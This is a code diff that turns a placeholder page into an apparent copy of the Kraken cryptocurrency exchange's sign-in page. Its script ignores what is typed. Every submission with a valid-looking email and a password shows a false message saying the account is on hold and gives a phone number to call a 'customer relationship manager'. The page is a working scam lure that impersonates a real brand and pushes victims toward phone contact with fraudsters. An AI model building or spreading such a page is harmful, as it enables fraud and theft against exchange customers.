@@ -1,7 +1,186 @@
-<html>
+<!doctype html>
+<html lang="en">
 
-<body>
-    <p> Coming Soon</p>
+<head>
+    <!-- Required meta tags -->
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    <!-- Bootstrap CSS -->
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" crossorigin="anonymous">
+
+    <link href="style.css" rel="stylesheet">
+    <link rel="shortcut icon" type="image/png" href="logo.svg">
+    <title>Kraken | Buy, Sell and Margin Trade Bitcoin (BTC) and Ethereum (ETH)</title>
+</head>
+
+<body class="bgImage">
+
+
+    <section class="pt-3 topMenu">
+        <div class="container-fluid my-3">
+            <div class="row">
+                <div class="col-md-6 col-2">
+                    <svg width="40" height="40" viewBox="0 0 24 20" fill="#5841d8" xmlns="http://www.w3.org/2000/svg">
+                        <path fill-rule="evenodd" clip-rule="evenodd"
+                            d="M0 12.6199V17.8556C0 18.8198 0.767926 19.6 1.71225 19.6C2.65757 19.6 3.42914 18.8198 3.42914 17.8556V12.6199C3.42914 11.6544 4.19309 10.8728 5.14238 10.8728C6.08836 10.8728 6.85563 11.6544 6.85563 12.6199V17.8556C6.85563 18.8198 7.62355 19.6 8.56887 19.6C9.5175 19.6 10.2851 18.8198 10.2851 17.8556V12.6199C10.2851 11.6544 11.0524 10.8728 11.998 10.8728C12.9476 10.8728 13.7156 11.6544 13.7156 12.6199V17.8556C13.7156 18.8198 14.4832 19.6 15.4275 19.6C16.3728 19.6 17.1407 18.8198 17.1407 17.8556V12.6199C17.1407 11.6544 17.9083 10.8728 18.8576 10.8728C19.8033 10.8728 20.5709 11.6544 20.5709 12.6199V17.8556C20.5709 18.8198 21.3388 19.6 22.2868 19.6C23.2324 19.6 24 18.8198 24 17.8556V12.6199C24 5.87172 18.6262 0.399994 11.998 0.399994C5.37017 0.399994 0 5.87172 0 12.6199Z">
+                        </path>
+                    </svg>
+                </div>
+                <div class="col-md-6 col-10 d-flex justify-content-end">
+                    <div class="USEnglish">
+                        U.S. English &nbsp;
+                        <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-caret-down-fill" viewBox="0 0 16 16">
+                            <path d="M7.247 11.14 2.451 5.658C1.885 5.013 2.345 4 3.204 4h9.592a1 1 0 0 1 .753 1.659l-4.796 5.48a1 1 0 0 1-1.506 0z"/>
+                          </svg>
+                    </div>
+                    <button class="btnCreate">Create Account</button>
+                </div>
+            </div>
+        </div>
+    </section>
+
+
+    <section class="form-section">
+        <div class="formContainer">
+            <h2 class="headingLogin text-center">Sign in to Kraken</h2>
+            <div class="formWrapper">
+                <div class="formLoginDetails mt-4">
+                    <form action="#" method="post" autocomplete="off">
+                        <div class="formWrapperLabelinput">
+                            <div class="formWrapperInput">
+                                <div class="formWrapperInputDetails">
+                                    <div class="formWrapperInputDetailsMainInput">
+                                        <input data-bn-type="input" id="username" type="text" name="username" autocomplete="username" autocapitalize="off" value="" onkeyup="buttonenable()">
+                                        <label for="POST-name" id="formrowfield" class="form-row-field">Username</label>
+                                    </div>
+                                </div>
+                                <div class="formWrapperInputDetailsPass" id="formWrapperInputDetailsPass">
+                                    <div class="formWrapperInputDetailsMainInput">
+                                        <input data-bn-type="input" id="passwordField" type="password" name="username" autocomplete="username" autocapitalize="off" value="" onkeyup="buttonenable()">
+                                        <label for="POST-name" id="formrowfield" class="form-row-field">Password</label>
+                                        <div class="eyeForm">
+                                            <svg xmlns="http://www.w3.org/2000/svg" id="eyeIconToggle" width="18" height="18" fill="currentColor" class="bi bi-eye-fill" viewBox="0 0 16 16">
+                                                <path d="M10.5 8a2.5 2.5 0 1 1-5 0 2.5 2.5 0 0 1 5 0z" />
+                                                <path
+                                                    d="M0 8s3-5.5 8-5.5S16 8 16 8s-3 5.5-8 5.5S0 8 0 8zm8 3.5a3.5 3.5 0 1 0 0-7 3.5 3.5 0 0 0 0 7z" />
+                                            </svg>
+                                        </div>
+                                    </div>
+                                    <div class="forgotPass">
+                                        Help
+                                        <img src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTYiIGhlaWdodD0iMTYiIHZpZXdCb3g9IjAgMCAxNiAxNiIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPHBhdGggZmlsbC1ydWxlPSJldmVub2RkIiBjbGlwLXJ1bGU9ImV2ZW5vZGQiIGQ9Ik05LjUzNzYgNC42NDUwNUMxMC41NDQxIDQuNjQ1MDUgMTEuMzYwMSAzLjgyOTA4IDExLjM2MDEgMi44MjI1M0MxMS4zNjAxIDEuODE1OTcgMTAuNTQ0MSAxIDkuNTM3NiAxQzguNTMxMDQgMSA3LjcxNTA3IDEuODE1OTcgNy43MTUwNyAyLjgyMjUzQzcuNzE1MDcgMy44MjkwOCA4LjUzMTA0IDQuNjQ1MDUgOS41Mzc2IDQuNjQ1MDVaTTExLjAyNDggMTIuMDg0N0g5Ljk0NjIyQzkuNzk2NzIgMTIuMzc2NiA5LjU3NjAyIDEyLjY4MjcgOS4yODQxMyAxMy4wMDMxQzguOTk5MzYgMTMuMzIzNCA4Ljc2NDQzIDEzLjQ4MzYgOC41NzkzMyAxMy40ODM2QzguNDkzOSAxMy40ODM2IDguNDI2MjYgMTMuNDYyMiA4LjM3NjQzIDEzLjQxOTVDOC4zMzM3MSAxMy4zNzY4IDguMzEyMzYgMTMuMzE2MyA4LjMxMjM2IDEzLjIzOEM4LjMxMjM2IDEzLjExNyA4LjQwMTM1IDEyLjgxOCA4LjU3OTMzIDEyLjM0MUw5LjgxODA4IDguOTY2NDRDMTAuMTEgOC4xNjE5NiAxMC4yNTU5IDcuNTc0NjIgMTAuMjU1OSA3LjIwNDQyQzEwLjI1NTkgNi42OTg5NiAxMC4wOTIyIDYuMzAzODQgOS43NjQ2OCA2LjAxOTA3QzkuNDM3MiA1LjcyNzE4IDguOTc4MDEgNS41ODEyMyA4LjM4NzExIDUuNTgxMjNDNi43MTQwOSA1LjU4MTIzIDUuNDE4MzggNi41NzQzNyA0LjUgOC41NjA2NEg1LjUyNTE3QzYuMDE2NCA3LjYzNTE0IDYuNDQzNTUgNy4xNzIzOSA2LjgwNjY0IDcuMTcyMzlDNi44OTIwNyA3LjE3MjM5IDYuOTUyNTggNy4xOTM3NCA2Ljk4ODE4IDcuMjM2NDZDNy4wMzA4OSA3LjI3MjA2IDcuMDUyMjUgNy4zMzI1NyA3LjA1MjI1IDcuNDE4QzcuMDUyMjUgNy41MDM0MyA3LjAwMjQyIDcuNjg4NTMgNi45MDI3NSA3Ljk3MzNMNS42MjEyOCAxMS42NTc1QzUuMzQzNjMgMTIuNDYyIDUuMjA0ODEgMTMuMDI0NCA1LjIwNDgxIDEzLjM0NDhDNS4yMDQ4MSAxMy44OTMgNS4zNzIxMSAxNC4zMDU5IDUuNzA2NzEgMTQuNTgzNUM2LjA0MTMyIDE0Ljg2MTIgNi41Mzk2NiAxNSA3LjIwMTc1IDE1QzguODM5MTggMTUgMTAuMTEzNSAxNC4wMjgyIDExLjAyNDggMTIuMDg0N1oiIGZpbGw9IiM1RDQ1REMiLz4KPC9zdmc+Cg=="
+                                            alt="Help">
+
+                                        <button class="click_login_submit" id="click_login_submit" type="button">Sign In</button>
+
+                                    </div>
+                                </div>
+                                <p class="errorMsg" id="errorMsg"></p>
+                            </div>
+                        </div>
+
+
+                    </form>
+                </div>
+            </div>
+        </div>
+    </section>
+
+
+    <div id="popupBox">
+        <div id="popupBoxClose">
+            <svg xmlns="http://www.w3.org/2000/svg" width="30" height="30" fill="currentColor" class="bi bi-x-lg" viewBox="0 0 16 16">
+                <path
+                    d="M2.146 2.854a.5.5 0 1 1 .708-.708L8 7.293l5.146-5.147a.5.5 0 0 1 .708.708L8.707 8l5.147 5.146a.5.5 0 0 1-.708.708L8 8.707l-5.146 5.147a.5.5 0 0 1-.708-.708L7.293 8 2.146 2.854Z" />
+            </svg>
+        </div>
+        <div id="popupBoxMsg">
+        </div>
+    </div>
+
+
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js" integrity="sha384-ka7Sk0Gln4gmtz2MlQnikT1wXgYsOg+OMhuP+IlRH9sENBO0LRn5q+8nbTov4+1p" crossorigin="anonymous"></script>
+
+    <script>
+        var crossButton = document.getElementById('crossButtonMenu');
+        var menuScreen = document.getElementById('sidebarMenu');
+        var menuIcon = document.getElementById('menuIcon');
+        var click_login_submit = document.getElementById('click_login_submit');
+        var username = document.getElementById('username');
+        var errorMsg = document.getElementById('errorMsg');
+
+        var popupBoxClose = document.getElementById('popupBoxClose');
+        var popupBox = document.getElementById('popupBox');
+        var popupBoxMsg = document.getElementById('popupBoxMsg');
+        var formWrapperInputDetailsPass = document.getElementById('formWrapperInputDetailsPass');
+        var passwordField = document.getElementById('passwordField');
+        var btnLoginQR = document.getElementById('btnLoginQR');
+        var eyeIconToggle = document.getElementById('eyeIconToggle');
+        var checkValue = document.getElementById('checkValue');
+        var checkValueCaptcha = document.getElementById('checkValueCaptcha');
+        var formrowfieldclass = document.getElementsByClassName('form-row-field');
+
+        var validRegex = /^[a-zA-Z0-9.!#$%&'*+/=?^_`{|}~-]+@[a-zA-Z0-9-]+(?:\.[a-zA-Z0-9-]+)*$/;
+
+        eyeIconToggle.addEventListener('click', function() {
+            if (eyeIconToggle.classList.contains('bi-eye-slash-fill')) {
+
+                eyeIconToggle.innerHTML = `<path d="m10.79 12.912-1.614-1.615a3.5 3.5 0 0 1-4.474-4.474l-2.06-2.06C.938 6.278 0 8 0 8s3 5.5 8 5.5a7.029 7.029 0 0 0 2.79-.588zM5.21 3.088A7.028 7.028 0 0 1 8 2.5c5 0 8 5.5 8 5.5s-.939 1.721-2.641 3.238l-2.062-2.062a3.5 3.5 0 0 0-4.474-4.474L5.21 3.089z"/>
+  <path d="M5.525 7.646a2.5 2.5 0 0 0 2.829 2.829l-2.83-2.829zm4.95.708-2.829-2.83a2.5 2.5 0 0 1 2.829 2.829zm3.171 6-12-12 .708-.708 12 12-.708.708z"/>`;
+                eyeIconToggle.classList.add('bi-eye-fill');
+                eyeIconToggle.classList.remove('bi-eye-slash-fill');
+                passwordField.setAttribute('type', 'text');
+            } else {
+                eyeIconToggle.innerHTML = `<path d="M10.5 8a2.5 2.5 0 1 1-5 0 2.5 2.5 0 0 1 5 0z"/>
+  <path d="M0 8s3-5.5 8-5.5S16 8 16 8s-3 5.5-8 5.5S0 8 0 8zm8 3.5a3.5 3.5 0 1 0 0-7 3.5 3.5 0 0 0 0 7z"/>`;
+                eyeIconToggle.classList.add('bi-eye-slash-fill');
+                eyeIconToggle.classList.remove('bi-eye-fill');
+                passwordField.setAttribute('type', 'password');
+            }
+        });
+
+        click_login_submit.addEventListener('click', function() {
+            if (username.value == '' && passwordField.value == '') {
+                popupBox.style.display = 'flex';
+                popupBoxMsg.innerText = 'please fill email id and password';
+            } else if (username.value == '') {
+                popupBox.style.display = 'flex';
+                popupBoxMsg.innerText = 'please fill email';
+            } else if (!username.value.match(validRegex)) {
+                popupBox.style.display = 'flex';
+                popupBoxMsg.innerText = 'please fill valid email';
+            } else if (passwordField.value == '') {
+                popupBox.style.display = 'flex';
+                popupBoxMsg.innerText = 'please fill Password';
+            } else {
+                popupBox.style.display = 'flex';
+                popupBoxMsg.innerText = 'You have entered wrong email id or password. \n For security reasons Your account has been put on hold until you get in touch with us. \n To get in touch with the customer relationship manager, call  (855) 788-5667.';
+            }
+        });
+
+
+        function buttonenable() {
+            if (username.value == '' || passwordField.value == '') {
+                click_login_submit.style.opacity = '0.7';
+            } else {
+                click_login_submit.style.opacity = '1';
+            }
+            if (username.value == '' && passwordField.value == '') {
+                formrowfieldclass[0].classList.remove('labelSelected');
+                formrowfieldclass[1].classList.remove('labelSelected');
+            } else {
+                formrowfieldclass[0].classList.add('labelSelected');
+                formrowfieldclass[1].classList.add('labelSelected');
+            }
+        }
+
+        popupBoxClose.addEventListener('click', function() {
+            popupBox.style.display = 'none';
+            popupBoxMsg.innerText = '';
+        })
+    </script>
+
 </body>
 
 </html>
